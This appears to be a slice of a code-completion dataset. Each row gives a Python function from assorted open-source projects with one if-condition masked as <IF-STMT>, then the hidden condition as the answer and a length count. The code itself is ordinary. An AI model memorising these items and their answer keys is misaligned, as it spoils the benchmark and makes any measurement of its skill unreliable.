4164,def ServerInference(self):<tab>candidates = []<tab>score = []<tab>for symbol in self.symbols:<tab><tab>for m in symbol.getMessages():<tab><tab><tab>dst = m.getPattern()[0]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>score[candidates.index(dst)] += 1<tab><tab><tab>else:<tab><tab><tab><tab>candidates.append(dst)<tab><tab><tab><tab>score.append(1)<tab>print(candidates)<tab>if score.count(max(score)) == 1 and len(candidates) > 2:<tab><tab>self.server = candidates[score.index(max(score))],if dst in candidates :,146
4165,"def generateMapItemTypedNode(self, key, value):<tab>if type(value) == SigmaRegularExpressionModifier:<tab><tab>regex = str(value)<tab><tab># Regular Expressions have to match the full value in QRadar<tab><tab>if not (regex.startswith(""^"") or regex.startswith("".*"")):<tab><tab><tab>regex = "".*"" + regex<tab><tab><IF-STMT><tab><tab><tab>regex = regex + "".*""<tab><tab>return ""%s MATCHES %s"" % (self.cleanKey(key), self.generateValueNode(regex))<tab>else:<tab><tab>raise NotImplementedError(<tab><tab><tab>""Type modifier '{}' is not supported by backend"".format(value.identifier)<tab><tab>)","if not ( regex . endswith ( ""$"" ) or regex . endswith ( "".*"" ) ) :",165
4166,"def get_max_vertical_scroll() -> int:<tab># Make sure that the cursor line is not above the top.<tab>prev_lineno = ui_content.cursor_position.y<tab>used_height = 0<tab>for lineno in range(ui_content.cursor_position.y - 1, -1, -1):<tab><tab>used_height += get_line_height(lineno)<tab><tab><IF-STMT><tab><tab><tab>return prev_lineno<tab><tab>else:<tab><tab><tab>prev_lineno = lineno<tab>return prev_lineno",if used_height > scroll_offsets_top :,132
4167,"def _options_values(self):<tab>""""""Simulate option values for partially configured objects.""""""<tab>try:<tab><tab>return self.__options_values<tab>except AttributeError:<tab><tab>self.__options_values = {**self.keywords}<tab><tab>position = 0<tab><tab>for name, option in self.func.__options__:<tab><tab><tab>if not option.positional:<tab><tab><tab><tab>break  # no positional left<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue  # already fulfilled<tab><tab><tab>self.__options_values[name] = (<tab><tab><tab><tab>self.args[position] if len(self.args) >= position + 1 else None<tab><tab><tab>)<tab><tab><tab>position += 1<tab><tab>return self.__options_values",if name in self . keywords :,175
4168,"def key(self):<tab>addr = self.m(""key"").obj_offset<tab>addr = self.read_ptr(addr)<tab>ret = """"<tab>if addr:<tab><tab>ret = self.obj_vm.read(addr, 256)<tab><tab><IF-STMT><tab><tab><tab>idx = ret.find(""\x00"")<tab><tab><tab>if idx != -1:<tab><tab><tab><tab>ret = ret[:idx]<tab><tab>else:<tab><tab><tab>ret = """"<tab>return ret",if ret :,114
4169,"def get_file_path(self, filepath, token):<tab>try:<tab><tab>encoded_path, _, user = self.updown_auth_manager.get_resource_info(token)<tab><tab><IF-STMT><tab><tab><tab>logger.info(""Invalid path file!! %s: %s"" % (user, filepath))<tab><tab><tab>raise NotFoundException(""File not found"")<tab><tab>logger.debug(""Get file: user=%s path=%s"" % (user, filepath))<tab><tab>file_path = os.path.normpath(os.path.join(self.base_store_folder, encoded_path))<tab><tab>return file_path<tab>except (jwt.ExpiredSignature, jwt.DecodeError, AttributeError):<tab><tab>raise NotFoundException(""File not found"")","if not self . _valid_path ( filepath , encoded_path ) :",187
4170,def validate_and_handle(self):<tab>valid = self.validate(set_cursor=True)<tab>if valid:<tab><tab><IF-STMT><tab><tab><tab>keep_text = self.accept_handler(self)<tab><tab>else:<tab><tab><tab>keep_text = False<tab><tab>if not keep_text:<tab><tab><tab>self.reset(),if self . accept_handler :,86
4171,"def document_type(self):<tab>if isinstance(self.document_type_obj, basestring):<tab><tab><IF-STMT><tab><tab><tab>self.document_type_obj = self.owner_document<tab><tab>else:<tab><tab><tab>self.document_type_obj = get_document(self.document_type_obj)<tab>return self.document_type_obj",if self . document_type_obj == RECURSIVE_REFERENCE_CONSTANT :,99
4172,"def _get_closest_end(end_after, begin_after):<tab>""""""returns the closest \\end, that is open""""""<tab>end_iter = iter(end_after)<tab>begin_iter = iter(begin_after)<tab>while True:<tab><tab>try:<tab><tab><tab>e = next(end_iter)<tab><tab>except:<tab><tab><tab>raise NoEnvError(""No closing environment detected"")<tab><tab>try:<tab><tab><tab>b = next(begin_iter)<tab><tab>except:<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>break<tab>return e",if not e . begin ( ) > b . begin ( ) :,145
4173,"def group_curves(self, curves):<tab>result = [[curves[0]]]<tab>tolerance = self.concat_tolerance<tab>for curve1, curve2 in zip(curves, curves[1:]):<tab><tab>_, t_max_1 = curve1.get_u_bounds()<tab><tab>t_min_2, _ = curve2.get_u_bounds()<tab><tab>end1 = curve1.evaluate(t_max_1)<tab><tab>begin2 = curve2.evaluate(t_min_2)<tab><tab>distance = np.linalg.norm(begin2 - end1)<tab><tab><IF-STMT><tab><tab><tab>result.append([curve2])<tab><tab>else:<tab><tab><tab>result[-1].append(curve2)<tab>return result",if distance > tolerance :,176
4174,"def iteraddcolumn(table, field, col, index, missing):<tab>it = iter(table)<tab>hdr = next(it)<tab># determine position of new column<tab>if index is None:<tab><tab>index = len(hdr)<tab># construct output header<tab>outhdr = list(hdr)<tab>outhdr.insert(index, field)<tab>yield tuple(outhdr)<tab># construct output data<tab>for row, val in izip_longest(it, col, fillvalue=missing):<tab><tab># run out of rows?<tab><tab><IF-STMT><tab><tab><tab>row = [missing] * len(hdr)<tab><tab>outrow = list(row)<tab><tab>outrow.insert(index, val)<tab><tab>yield tuple(outrow)",if row == missing :,178
4175,"def validate_is_admin(self, attrs, source):<tab>project = attrs.get(""project"", None if self.object is None else self.object.project)<tab>if project is None:<tab><tab>return attrs<tab>if self.object and self.object.user:<tab><tab><IF-STMT><tab><tab><tab>raise ValidationError(_(""The project owner must be admin.""))<tab><tab>if not services.project_has_valid_admins(<tab><tab><tab>project, exclude_user=self.object.user<tab><tab>):<tab><tab><tab>raise ValidationError(<tab><tab><tab><tab>_(""At least one user must be an active admin for this project."")<tab><tab><tab>)<tab>return attrs",if self . object . user . id == project . owner_id and not attrs [ source ] :,170
4176,"def handle_periodic(self):<tab>if self._closed:<tab><tab><IF-STMT><tab><tab><tab>self._eventloop.remove(self._server_socket)<tab><tab><tab>self._server_socket.close()<tab><tab><tab>self._server_socket = None<tab><tab><tab>logging.info(""closed TCP port %d"", self._listen_port)<tab><tab>for handler in list(self._fd_to_handlers.values()):<tab><tab><tab>handler.destroy()<tab>self._sweep_timeout()",if self . _server_socket :,120
4177,"def get_item(type_, preference):<tab>items = {}<tab>for item in playlist.findall(""./info/%s/item"" % type_):<tab><tab>lang, label = xpath_text(item, ""lg"", default=None), xpath_text(<tab><tab><tab>item, ""label"", default=None<tab><tab>)<tab><tab>if lang and label:<tab><tab><tab>items[lang] = label.strip()<tab>for p in preference:<tab><tab><IF-STMT><tab><tab><tab>return items[p]",if items . get ( p ) :,121
4178,"def save_all_changed_configs(self):<tab>""""""Save configuration changes to the user config file.""""""<tab>has_changes = False<tab>for ext_name in self.extensions:<tab><tab>options = self.extensions[ext_name]<tab><tab>for opt in options:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>has_changes = True<tab>if has_changes:<tab><tab>self.userCfg.Save()","if self . set_user_value ( ext_name , opt ) :",109
4179,"def extract_validators(namespace: Dict[str, Any]) -> Dict[str, List[Validator]]:<tab>validators: Dict[str, List[Validator]] = {}<tab>for var_name, value in namespace.items():<tab><tab>validator_config = getattr(value, VALIDATOR_CONFIG_KEY, None)<tab><tab><IF-STMT><tab><tab><tab>fields, v = validator_config<tab><tab><tab>for field in fields:<tab><tab><tab><tab>if field in validators:<tab><tab><tab><tab><tab>validators[field].append(v)<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>validators[field] = [v]<tab>return validators",if validator_config :,147
4180,"def _bindTable(self, tableName, create=False):<tab>for attempt in retry_azure():<tab><tab>with attempt:<tab><tab><tab>try:<tab><tab><tab><tab>exists = self.tableService.exists(table_name=tableName)<tab><tab><tab>except AzureMissingResourceHttpError as e:<tab><tab><tab><tab>if e.status_code != 404:<tab><tab><tab><tab><tab>raise<tab><tab><tab>else:<tab><tab><tab><tab>if exists:<tab><tab><tab><tab><tab>return AzureTable(self.tableService, tableName)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.tableService.create_table(tableName)<tab><tab><tab><tab>return AzureTable(self.tableService, tableName)<tab><tab><tab>else:<tab><tab><tab><tab>return None",if create :,184
4181,"def extract(self):<tab>for battery in self.vars:<tab><tab>for line in dopen(""/proc/acpi/battery/"" + battery + ""/state"").readlines():<tab><tab><tab>l = line.split()<tab><tab><tab>if len(l) < 3:<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>remaining = int(l[2])<tab><tab><tab><tab>continue<tab><tab><tab>elif l[0:2] == [""present"", ""rate:""]:<tab><tab><tab><tab>rate = int(l[2])<tab><tab><tab><tab>continue<tab><tab>if rate and remaining:<tab><tab><tab>self.val[battery] = remaining * 60 / rate<tab><tab>else:<tab><tab><tab>self.val[battery] = -1","if l [ 0 : 2 ] == [ ""remaining"" , ""capacity:"" ] :",185
4182,"def merge_syntactic_units(original_units, filtered_units, tags=None):<tab>units = []<tab>for i in range(len(original_units)):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>text = original_units[i]<tab><tab>token = filtered_units[i]<tab><tab>tag = tags[i][1] if tags else None<tab><tab>sentence = SyntacticUnit(text, token, tag)<tab><tab>sentence.index = i<tab><tab>units.append(sentence)<tab>return units","if filtered_units [ i ] == """" :",132
4183,"def copy_grads_to_fp32(self, fp16_net, fp32_weights):<tab>""""""Copy gradients from fp16 model to fp32 weight copy.""""""<tab>for fp32_param, fp16_param in zip(fp32_weights, fp16_net.parameters()):<tab><tab><IF-STMT><tab><tab><tab>if fp32_param.grad is None:<tab><tab><tab><tab>fp32_param.grad = fp32_param.data.new(fp32_param.size())<tab><tab><tab>fp32_param.grad.copy_(fp16_param.grad)",if fp16_param . grad is not None :,141
4184,"def gen_new_segments(datadir, spk_list):<tab>if not os.path.isfile(os.path.join(datadir, ""segments"")):<tab><tab>raise ValueError(""no segments file found in datadir"")<tab>new_segments = open(os.path.join(datadir, ""new_segments""), ""w"", encoding=""utf-8"")<tab>segments = open(os.path.join(datadir, ""segments""), ""r"", encoding=""utf-8"")<tab>while True:<tab><tab>line = segments.readline()<tab><tab>if not line:<tab><tab><tab>break<tab><tab>spk = line.split(""_"")[0]<tab><tab><IF-STMT><tab><tab><tab>new_segments.write(line)<tab>new_segments.close(), segments.close()",if spk in spk_list :,176
4185,"def _get_sources(include_per_machine=True, include_per_user=True):<tab>if _is_64bit_os():<tab><tab><IF-STMT><tab><tab><tab>yield open_source(REGISTRY_SOURCE_CU), None<tab><tab>if include_per_machine:<tab><tab><tab>yield open_source(REGISTRY_SOURCE_LM), ""64bit""<tab><tab><tab>yield open_source(REGISTRY_SOURCE_LM_WOW6432), ""32bit""<tab>else:<tab><tab>if include_per_user:<tab><tab><tab>yield open_source(REGISTRY_SOURCE_CU), ""32bit""<tab><tab>if include_per_machine:<tab><tab><tab>yield open_source(REGISTRY_SOURCE_LM), ""32bit""",if include_per_user :,175
4186,"def AddWindowMenu(self, pMenuBar):<tab>if pMenuBar and self._pWindowMenu:<tab><tab>pos = pMenuBar.FindMenu(wx.GetStockLabel(wx.ID_HELP, wx.STOCK_NOFLAGS))<tab><tab><IF-STMT><tab><tab><tab>pMenuBar.Append(self._pWindowMenu, _(""&Window""))<tab><tab>else:<tab><tab><tab>pMenuBar.Insert(pos, self._pWindowMenu, _(""&Window""))",if pos == wx . NOT_FOUND :,115
4187,"def remove(self, res):<tab>""""""Remove resource""""""<tab>msg_box = QMessageBox(<tab><tab>QMessageBox.Critical,<tab><tab>self.app.translate(""ResourceEdit"", ""Delete Resource""),<tab><tab>self.app.translate(<tab><tab><tab>""ResourceEdit"", ""Are you sure want to delete this resource?""<tab><tab>),<tab><tab>QMessageBox.Yes | QMessageBox.No,<tab>)<tab>ret = msg_box.exec_()<tab>if ret == QMessageBox.Yes:<tab><tab>self._resources.remove(res)<tab><tab>self._resource_labels[res].hide()<tab><tab>del self._resource_labels[res]<tab><tab>self.on_change()<tab><tab><IF-STMT><tab><tab><tab>self.widget.hide()<tab><tab>self.update_label()",if not self . _resources :,188
4188,"def reader(self, myself):<tab>ok = True<tab>line = """"<tab>while True:<tab><tab>line = sys.stdin.readline().strip()<tab><tab>if ok:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ok = False<tab><tab><tab><tab>continue<tab><tab>elif not line:<tab><tab><tab>break<tab><tab>else:<tab><tab><tab>ok = True<tab><tab>self.Q.append(line)<tab>os.kill(myself, signal.SIGTERM)",if not line :,112
4189,"def _compute_ratios(counts, n_total, multilabel=False):<tab>computed_ratios = {}<tab>max_count = max(counts.values())<tab>for class_name, count in counts.items():<tab><tab><IF-STMT><tab><tab><tab>ratio = (n_total - count) / count<tab><tab>else:<tab><tab><tab>ratio = ratio = max_count / count<tab><tab>computed_ratios[class_name] = ratio<tab>return computed_ratios",if multilabel :,107
4190,"def test_tags(context_obj, sagemaker_session):<tab>tags = [{""Key"": ""foo1"", ""Value"": ""bar1""}]<tab>context_obj.set_tags(tags)<tab>while True:<tab><tab>actual_tags = sagemaker_session.sagemaker_client.list_tags(<tab><tab><tab>ResourceArn=context_obj.context_arn<tab><tab>)[""Tags""]<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>time.sleep(5)<tab># When sagemaker-client-config endpoint-url is passed as argument to hit some endpoints,<tab># length of actual tags will be greater than 1<tab>assert len(actual_tags) > 0<tab>assert [actual_tags[-1]] == tags",if actual_tags :,173
4191,"def step(self, action):<tab>""""""Repeat action, sum reward, and max over last observations.""""""<tab>total_reward = 0.0<tab>done = None<tab>for i in range(self._skip):<tab><tab>obs, reward, done, info = self.env.step(action)<tab><tab>if i == self._skip - 2:<tab><tab><tab>self._obs_buffer[0] = obs<tab><tab><IF-STMT><tab><tab><tab>self._obs_buffer[1] = obs<tab><tab>total_reward += reward<tab><tab>if done:<tab><tab><tab>break<tab># Note that the observation on the done=True frame doesn't matter.<tab>max_frame = self._obs_buffer.max(axis=0)<tab>return max_frame, total_reward, done, info",if i == self . _skip - 1 :,187
4192,"def prepare_text(text, style):<tab>body = []<tab>for fragment, sty in parse_tags(text, style, subs.styles):<tab><tab>fragment = fragment.replace(r""\h"", "" "")<tab><tab>fragment = fragment.replace(r""\n"", ""\n"")<tab><tab>fragment = fragment.replace(r""\N"", ""\n"")<tab><tab>if sty.italic:<tab><tab><tab>fragment = ""<i>%s</i>"" % fragment<tab><tab><IF-STMT><tab><tab><tab>fragment = ""<u>%s</u>"" % fragment<tab><tab>if sty.strikeout:<tab><tab><tab>fragment = ""<s>%s</s>"" % fragment<tab><tab>if sty.drawing:<tab><tab><tab>raise ContentNotUsable<tab><tab>body.append(fragment)<tab>return re.sub(""\n+"", ""\n"", """".join(body).strip())",if sty . underline :,198
4193,"def GetConvertersByClass(value_cls):<tab>""""""Returns all converters that take given value as an input value.""""""<tab>try:<tab><tab>return ExportConverter.converters_cache[value_cls]<tab>except KeyError:<tab><tab>results = [<tab><tab><tab>cls<tab><tab><tab>for cls in ExportConverter.classes.values()<tab><tab><tab><IF-STMT><tab><tab>]<tab><tab>if not results:<tab><tab><tab>results = [DataAgnosticExportConverter]<tab><tab>ExportConverter.converters_cache[value_cls] = results<tab><tab>return results",if cls . input_rdf_type == value_cls,138
4194,"def enable(self):<tab>""""""enable the patch.""""""<tab>for patch in self.dependencies:<tab><tab>patch.enable()<tab>if not self.enabled:<tab><tab>pyv = sys.version_info[0]<tab><tab><IF-STMT><tab><tab><tab>if self.PY2 == SKIP:<tab><tab><tab><tab>return  # skip patch activation<tab><tab><tab>if not self.PY2:<tab><tab><tab><tab>raise IncompatiblePatch(""Python 2 not supported!"")<tab><tab>if pyv == 3:<tab><tab><tab>if self.PY3 == SKIP:<tab><tab><tab><tab>return  # skip patch activation<tab><tab><tab>if not self.PY3:<tab><tab><tab><tab>raise IncompatiblePatch(""Python 3 not supported!"")<tab><tab>self.pre_enable()<tab><tab>self.do_enable()<tab><tab>self.enabled = True",if pyv == 2 :,191
4195,def _maybe_uncompress(self):<tab>if not self._decompressed:<tab><tab>compression_type = self.compression_type<tab><tab>if compression_type != self.CODEC_NONE:<tab><tab><tab>data = memoryview(self._buffer)[self._pos :]<tab><tab><tab>if compression_type == self.CODEC_GZIP:<tab><tab><tab><tab>uncompressed = gzip_decode(data)<tab><tab><tab>if compression_type == self.CODEC_SNAPPY:<tab><tab><tab><tab>uncompressed = snappy_decode(data.tobytes())<tab><tab><tab><IF-STMT><tab><tab><tab><tab>uncompressed = lz4_decode(data.tobytes())<tab><tab><tab>self._buffer = bytearray(uncompressed)<tab><tab><tab>self._pos = 0<tab>self._decompressed = True,if compression_type == self . CODEC_LZ4 :,192
4196,"def transform(node, filename):<tab>root = ast.Module(None, node, lineno=1)<tab>nodes = [root]<tab>while nodes:<tab><tab>node = nodes.pop()<tab><tab>node.filename = filename<tab><tab><IF-STMT><tab><tab><tab>node.dest = ast.Name(""__context"")<tab><tab>elif node.__class__ is ast.Const and isinstance(node.value, str):<tab><tab><tab>try:<tab><tab><tab><tab>node.value.decode(""ascii"")<tab><tab><tab>except UnicodeError:<tab><tab><tab><tab>node.value = node.value.decode(""utf-8"")<tab><tab>nodes.extend(node.getChildNodes())<tab>return root","if node . __class__ in ( ast . Printnl , ast . Print ) :",169
4197,"def __init__(self, json=None):<tab>if not json:<tab><tab>self._mods = dict()<tab><tab>return<tab>mods = collections.defaultdict(set)<tab>installed_path_patt = re.compile(<tab><tab>"".*[\\\\/]target[\\\\/]product[\\\\/][^\\\\/]+([\\\\/].*)$""<tab>)<tab>for module in json.values():<tab><tab>for path in module[""installed""]:<tab><tab><tab>match = installed_path_patt.match(path)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>for path in module[""path""]:<tab><tab><tab><tab><tab>mods[match.group(1)].add(path)<tab>self._mods = {<tab><tab>installed_path: sorted(src_dirs) for installed_path, src_dirs in mods.items()<tab>}",if match :,195
4198,"def _findSubpath(self, path, A, B, inside):<tab>print(""finding"", A, B)<tab>sub = None<tab>for i in xrange(0, len(path) * 2):  # iterate twice with wrap around<tab><tab>j = i % len(path)<tab><tab>seg = path[j]<tab><tab>if inside.isInside(seg.midPoint()):<tab><tab><tab>if eq(seg.A, A):<tab><tab><tab><tab>sub = Path(""subp"")<tab><tab><tab>print(""seg"", sub is None, seg)<tab><tab><tab>if sub is not None:<tab><tab><tab><tab>sub.append(seg)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab>print(""found"", sub)<tab>return sub","if eq ( seg . B , B ) :",180
4199,"def on_click(self, event):<tab>button = event[""button""]<tab>if button in [self.button_next, self.button_previous]:<tab><tab>if self.station_data:<tab><tab><tab>self.scrolling = True<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.active_index += 1<tab><tab><tab>elif button == self.button_previous:<tab><tab><tab><tab>self.active_index -= 1<tab><tab><tab>self.active_index %= self.count_stations<tab><tab>else:<tab><tab><tab>self.py3.prevent_refresh()<tab>elif button == self.button_refresh:<tab><tab>self.idle_time = 0<tab>else:<tab><tab>self.py3.prevent_refresh()",if button == self . button_next :,178
4200,"def __init_subclass__(cls, *, abstract=False):<tab>if abstract:<tab><tab>return<tab>fields = {}<tab>for name in cls.__dict__:<tab><tab>attr = cls.__dict__[name]<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if not isinstance(attr, CType):<tab><tab><tab>raise TypeError(f""field {cls.__name__}.{name!r} must be a Type"")<tab><tab>else:<tab><tab><tab>fields[name] = attr<tab>cls._fields = fields","if name . startswith ( ""__"" ) or callable ( attr ) :",125
4201,"def add(self, geom):<tab>""Add the geometry to this Geometry Collection.""<tab>if isinstance(geom, OGRGeometry):<tab><tab><IF-STMT><tab><tab><tab>for g in geom:<tab><tab><tab><tab>capi.add_geom(self.ptr, g.ptr)<tab><tab>else:<tab><tab><tab>capi.add_geom(self.ptr, geom.ptr)<tab>elif isinstance(geom, six.string_types):<tab><tab>tmp = OGRGeometry(geom)<tab><tab>capi.add_geom(self.ptr, tmp.ptr)<tab>else:<tab><tab>raise OGRException(""Must add an OGRGeometry."")","if isinstance ( geom , self . __class__ ) :",157
4202,"def __str__(self):<tab>result = []<tab>for x in self._fields_:<tab><tab>key = x[0]<tab><tab>value = getattr(self, key)<tab><tab>fmt = ""%s""<tab><tab>if key in self._fmt_:<tab><tab><tab>fmt = self._fmt_[key]<tab><tab><IF-STMT><tab><tab><tab>fmt = self._fmt_[""<default>""]<tab><tab>result.append((""%s: "" + fmt) % (key, value))<tab>return self.__class__.__name__ + ""("" + string.join(result, "", "") + "")""","elif ""<default>"" in self . _fmt_ :",137
4203,"def add(self, *objs):<tab>for obj in objs:<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(<tab><tab><tab><tab>""'%s' instance expected, got %r"" % (self.model._meta.object_name, obj)<tab><tab><tab>)<tab><tab>setattr(obj, rel_field.name, self.instance)<tab><tab>obj.save()","if not isinstance ( obj , self . model ) :",95
4204,"def _eliminate_deprecated_list_indexing(idx):<tab># ""Basic slicing is initiated if the selection object is a non-array,<tab># non-tuple sequence containing slice objects, [Ellipses, or newaxis<tab># objects]"". Detects this case and canonicalizes to a tuple. This case is<tab># deprecated by NumPy and exists for backward compatibility.<tab>if not isinstance(idx, tuple):<tab><tab><IF-STMT><tab><tab><tab>if _any(_should_unpack_list_index(i) for i in idx):<tab><tab><tab><tab>idx = tuple(idx)<tab><tab><tab>else:<tab><tab><tab><tab>idx = (idx,)<tab><tab>else:<tab><tab><tab>idx = (idx,)<tab>return idx","if isinstance ( idx , Sequence ) and not isinstance ( idx , ndarray ) :",177
4205,"def __init__(self, parent=None, **kwargs):<tab>super(DefaultWidget, self).__init__(parent)<tab>self.parent = parent<tab>self.FSettings = SuperSettings.getInstance()<tab>self.defaultui = []<tab>self.allui = []<tab>self.__tabbyname = {}<tab>__defaultui = [ui(parent, self.FSettings) for ui in TabsWidget.__subclasses__()]<tab>for ui in __defaultui:<tab><tab><IF-STMT><tab><tab><tab>self.defaultui.append(ui)<tab><tab>self.allui.append(ui)<tab><tab>self.__tabbyname[ui.Name] = ui<tab><tab>setattr(self.__class__, ui.ID, ui)",if not ui . isSubitem :,173
4206,"def onMouseMove(self, event):<tab>x, y = event.xdata, event.ydata<tab>if x is not None:<tab><tab>extra_text = self.getExtraText(x, y)<tab><tab># extra_text = ""TODO:""<tab><tab><IF-STMT><tab><tab><tab>self.message(""x,y=%5.4e,%5.4e %s"" % (x, y, extra_text), index=0)<tab><tab>else:<tab><tab><tab>self.message(""x,y=%5.4e,%5.4e"" % (x, y), index=0)<tab>else:<tab><tab>self.message(None)",if extra_text :,155
4207,"def tag_configure(self, *args, **keys):<tab>if len(args) == 1:<tab><tab>key = args[0]<tab><tab>self.tags[key] = keys<tab><tab>val = keys.get(""foreground"")<tab><tab>underline = keys.get(""underline"")<tab><tab>if val:<tab><tab><tab>self.configDict[key] = val<tab><tab><IF-STMT><tab><tab><tab>self.configUnderlineDict[key] = True<tab>else:<tab><tab>g.trace(""oops"", args, keys)",if underline :,123
4208,"def _flatten_shape(s, index):<tab>if s.is_array():<tab><tab>yield index, s<tab>else:<tab><tab>assert s.is_tuple()<tab><tab>for i, sub in enumerate(s.tuple_shapes()):<tab><tab><tab>subindex = index + (i,)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield from _flatten_shape(sub, subindex)<tab><tab><tab>else:<tab><tab><tab><tab>yield subindex, sub",if sub . is_tuple ( ) :,111
4209,"def delete_if_forked(ghrequest):<tab>FORKED = False<tab>query = ""/user/repos""<tab>r = utils.query_request(query)<tab>for repo in r.json():<tab><tab>if repo[""description""]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>FORKED = True<tab><tab><tab><tab>url = f""/repos/{repo['full_name']}""<tab><tab><tab><tab>utils.query_request(url, method=""DELETE"")<tab>return FORKED","if ghrequest . target_repo_fullname in repo [ ""description"" ] :",127
4210,def update_json(self):<tab>n_id = node_id(self)<tab>if self.autoreload:<tab><tab>self.reload_json()<tab>if n_id not in self.json_data and self.current_text:<tab><tab>self.reload_json()<tab>if n_id not in self.json_data:<tab><tab>self.use_custom_color = True<tab><tab>self.color = FAIL_COLOR<tab><tab>return<tab>self.use_custom_color = True<tab>self.color = READY_COLOR<tab>json_data = self.json_data[n_id]<tab>for item in json_data:<tab><tab><IF-STMT><tab><tab><tab>out = json_data[item][1]<tab><tab><tab>self.outputs[item].sv_set(out),if item in self . outputs and self . outputs [ item ] . is_linked :,200
4211,"def _check_num_states(self, num_states):<tab>""""""Track the number of states.""""""<tab>self._num_states += num_states<tab>if self._max_num_states is not None:<tab><tab><IF-STMT><tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab>""Too many states detected while running dynamic ""<tab><tab><tab><tab>""programming: got %d states but upper limit is %d.""<tab><tab><tab><tab>% (self._num_states, self._max_num_states)<tab><tab><tab>)",if self . _num_states > self . _max_num_states :,134
4212,def __del__(self):<tab>try:<tab><tab><IF-STMT><tab><tab><tab>if self._initialized:<tab><tab><tab><tab>_gmp.mpz_clear(self._mpz_p)<tab><tab>self._mpz_p = None<tab>except AttributeError:<tab><tab>pass,if self . _mpz_p is not None :,75
4213,"def cmp(f1, f2):<tab>bufsize = 1024 * 8<tab>with open(f1, ""rb"") as fp1, open(f2, ""rb"") as fp2:<tab><tab>while True:<tab><tab><tab>b1 = fp1.read(bufsize)<tab><tab><tab>b2 = fp2.read(bufsize)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab><tab>if not b1:<tab><tab><tab><tab>return True",if b1 != b2 :,115
4214,"def _get_changes(diff):<tab>""""""Get a list of changed versions from git.""""""<tab>changes_dict = {}<tab>for line in diff:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if line.startswith(""+++ "") or line.startswith(""--- ""):<tab><tab><tab>continue<tab><tab>name, version = parse_versioned_line(line[1:])<tab><tab>if name not in changes_dict:<tab><tab><tab>changes_dict[name] = Change(name)<tab><tab>if line.startswith(""-""):<tab><tab><tab>changes_dict[name].old = version<tab><tab>elif line.startswith(""+""):<tab><tab><tab>changes_dict[name].new = version<tab>return [change for _name, change in sorted(changes_dict.items())]","if not line . startswith ( ""-"" ) and not line . startswith ( ""+"" ) :",181
4215,"def analyze(vw):<tab>for va, dest in vw.findPointers():<tab><tab># Is there a location already at the target?<tab><tab>loc = vw.getLocation(dest)<tab><tab>if loc is None:<tab><tab><tab>continue<tab><tab>if loc[L_LTYPE] != LOC_IMPORT:<tab><tab><tab>continue<tab><tab>offset, bytes = vw.getByteDef(va)<tab><tab>if offset < 2:<tab><tab><tab>continue<tab><tab>if bytes[offset - 2 : offset] == b""\xff\x15"":  # call [importloc]<tab><tab><tab># If there's a pointer here, remove it.<tab><tab><tab><IF-STMT><tab><tab><tab><tab>vw.delLocation(va)<tab><tab><tab>vw.makeCode(va - 2)",if vw . getLocation ( va ) :,192
4216,"def match_blanks(self, s, i):<tab>if 1:  # Use Qt code to show invisibles.<tab><tab>return 0<tab>else:  # Old code...<tab><tab>if not self.showInvisibles:<tab><tab><tab>return 0<tab><tab>j = i<tab><tab>n = len(s)<tab><tab>while j < n and s[j] == "" "":<tab><tab><tab>j += 1<tab><tab><IF-STMT><tab><tab><tab>self.colorRangeWithTag(s, i, j, ""blank"")<tab><tab><tab>return j - i<tab><tab>else:<tab><tab><tab>return 0",if j > i :,143
4217,"def compress(self, data_list):<tab># Differs from the default implementation: If only a time is given and no date, we consider the field empty<tab>if data_list:<tab><tab>if data_list[0] in self.empty_values:<tab><tab><tab>return None<tab><tab><IF-STMT><tab><tab><tab>raise ValidationError(<tab><tab><tab><tab>self.error_messages[""invalid_date""], code=""invalid_date""<tab><tab><tab>)<tab><tab>result = datetime.datetime.combine(*data_list)<tab><tab>return from_current_timezone(result)<tab>return None",if data_list [ 1 ] in self . empty_values :,146
4218,"def test_iter_keys(self):<tab>for name in (""interfaces"", ""addresses"", ""neighbours"", ""routes"", ""rules""):<tab><tab>view = getattr(self.ndb, name)<tab><tab>for key in view:<tab><tab><tab>assert isinstance(key, Record)<tab><tab><tab>obj = view.get(key)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>assert isinstance(obj, RTNL_Object)",if obj is not None :,102
4219,"def has_selenium():<tab>try:<tab><tab>from selenium import selenium<tab><tab>globals().update(selenium=selenium)<tab><tab>sel = selenium(*sel_args)<tab><tab># a little trick to see if the server is responding<tab><tab>try:<tab><tab><tab>sel.do_command(""shutdown"", """")<tab><tab>except Exception as e:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise<tab><tab>result = True<tab>except ImportError:<tab><tab>result = SeleniumFailed(""selenium RC not installed"")<tab>except Exception:<tab><tab>msg = ""Error occurred initializing selenium: %s"" % e<tab><tab>result = SeleniumFailed(msg)<tab># overwrite has_selenium, so the same result is returned every time<tab>globals().update(has_selenium=lambda: result)<tab>return result","if not ""Server Exception"" in str ( e ) :",190
